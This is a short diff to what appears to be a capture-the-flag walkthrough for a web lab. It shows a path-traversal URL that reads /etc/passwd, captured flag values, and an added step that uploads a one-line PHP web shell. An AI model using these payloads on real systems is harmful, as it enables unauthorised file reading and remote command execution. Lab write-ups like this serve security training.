@@ -79,3 +79,6 @@ VM147:18 Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693
   1. Navigate to http://10.11.249.72/?page=../../../../../../../../../etc/passwd
   2. Flag = b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
 
+# 8. Upload Image -  NOT FOUND
+  1. upload image with <?php system($_GET['cmd']); ?>
+
